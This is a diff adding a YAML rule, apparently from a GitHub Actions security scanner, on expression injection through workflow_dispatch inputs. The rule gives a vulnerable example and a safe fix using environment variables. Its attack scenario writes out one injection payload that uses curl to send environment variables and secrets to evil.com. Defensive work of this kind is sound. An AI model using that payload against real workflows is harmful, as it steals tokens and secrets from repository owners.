@@ -1,0 +1,79 @@
+id: VXS-014
+name: "Expression Injection via workflow_dispatch Input"
+severity: high
+description: >
+  A `run:` block in a GitHub Actions workflow contains a `${{ }}` expression that
+  directly interpolates a `github.event.inputs.*` value. When `workflow_dispatch`
+  inputs are interpolated directly into shell scripts, any user with permission to
+  trigger the workflow can inject arbitrary shell commands. GitHub Actions expression
+  interpolation happens at the template level before the shell sees the script, so
+  quoting within the workflow file cannot prevent injection. The attacker's input
+  value becomes part of the shell script source code itself.
+
+tags:
+  - injection
+  - expression-injection
+  - workflow-dispatch
+
+attack_scenario: >
+  A repository has a `workflow_dispatch` workflow that accepts a `version` input
+  and interpolates it directly into a `run:` block like
+  `echo "Deploying version ${{ github.event.inputs.version }}"`. An attacker with
+  write access (or a collaborator on a public repo) triggers the workflow manually
+  and sets the version input to `"; curl https://evil.com/exfil -d @<(env); echo "`.
+  The expression interpolation splices this payload directly into the shell script,
+  which then executes with full runner privileges -- exfiltrating environment
+  variables (including GITHUB_TOKEN and any configured secrets), installing
+  backdoors, or modifying repository contents. This is especially dangerous when
+  the workflow performs deployments, publishes packages, or has elevated permissions,
+  because the attacker can hijack those privileged operations through a seemingly
+  innocuous text input field.
+
+real_world_incident: >
+  Expression injection via workflow_dispatch inputs follows the same vulnerability
+  class as branch-name and PR-title injection (VXS-002), which was identified
+  across hundreds of repositories by GitHub Security Lab in 2022-2023. While
+  workflow_dispatch requires the attacker to have workflow trigger permissions,
+  this is commonly available to all collaborators and, on public repositories,
+  to any GitHub user with push access. The same template-level interpolation
+  mechanism that makes branch-name injection dangerous applies equally to
+  workflow_dispatch inputs.
+
+fix: |
+  **Never interpolate `${{ github.event.inputs.* }}` directly in `run:` blocks.**
+  Instead, pass input values through environment variables, which are properly
+  escaped by the shell.
+
+  **Vulnerable pattern:**
+
+  ```yaml
+  # DANGEROUS: Direct interpolation -- user input controls the shell script
+  on:
+    workflow_dispatch:
+      inputs:
+        version:
+          description: 'Version to deploy'
+          required: true
+
+  jobs:
+    deploy:
+      runs-on: ubuntu-latest
+      steps:
+        - run: echo "Deploying version ${{ github.event.inputs.version }}"
+  ```
+
+  **Safe pattern using environment variables:**
+
+  ```yaml
+  # SAFE: Input value is passed as an environment variable
+  - run: echo "Deploying version ${VERSION}"
+    env:
+      VERSION: ${{ github.event.inputs.version }}
+  ```
+
+  **Why this works:** When you use `${{ }}` in the `env:` mapping, the value is
+  assigned to an environment variable. When the shell script references `${VERSION}`,
+  the shell treats it as a data value, not as executable code. Shell metacharacters
+  in the value are not interpreted as shell syntax.
+
+references: []
